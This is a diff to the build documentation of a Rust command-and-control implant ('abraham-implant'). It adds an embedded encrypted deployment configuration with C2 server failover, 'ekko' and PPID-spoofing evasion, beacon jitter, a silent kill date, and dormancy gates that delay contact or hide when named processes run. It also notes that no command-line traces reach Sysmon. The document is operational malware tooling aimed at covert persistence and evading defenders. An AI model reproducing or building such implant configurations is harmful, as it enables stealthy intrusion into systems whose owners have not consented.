@@ -41,17 +41,24 @@ target\release\abraham-implant.exe --server <host:port> --key <contents of serve
 ```
 
 **Operational build** — no command line at all. The deployment
-configuration is compiled in under a build-random XOR keystream and the
-CLI parser/log strings do not exist in the artifact (Sysmon EID 1 sees a
-bare image path):
+configuration is compiled in (one encrypted JSON blob, schema in
+`docs/protocol.md` §8.1) and the CLI parser/log strings do not exist in
+the artifact (Sysmon EID 1 sees a bare image path):
 
 ```
-{"server": "c2.example.com:443", "key": "<server.pub hex>",
- "tls_pin": "<sha256-hex or empty>", "evasion": "ekko,ppid",
- "profile": "sleep_secs: 30\njitter: 0.4\n"}  > embed.json
+{"servers": ["c2.example.com:443", "backup.example.com:443"],
+ "key": "<server.pub hex>", "tls_pin": "<sha256-hex or empty>",
+ "evasion": "ekko,ppid", "profile": "sleep_secs: 30\njitter: 0.4\n",
+ "kill_date": 1797036250,
+ "gates": {"initial_delay_max_secs": 0, "blocked_processes": []}}  > embed.json
 set ABRAHAM_EMBED=C:\path\embed.json
 cargo build --release -p abraham-implant
 ```
+
+`kill_date` (unix seconds, 0 = never) makes the implant exit silently
+once past it; `gates` hold the random pre-contact activation delay and
+the blocked-process dormancy list; `servers` is the failover order
+(rotate after 3 consecutive failures, same session resumed).
 
 A build with neither embedded configuration nor flags exits (fail
 closed — there is no localhost default). CI gates the artifact with a
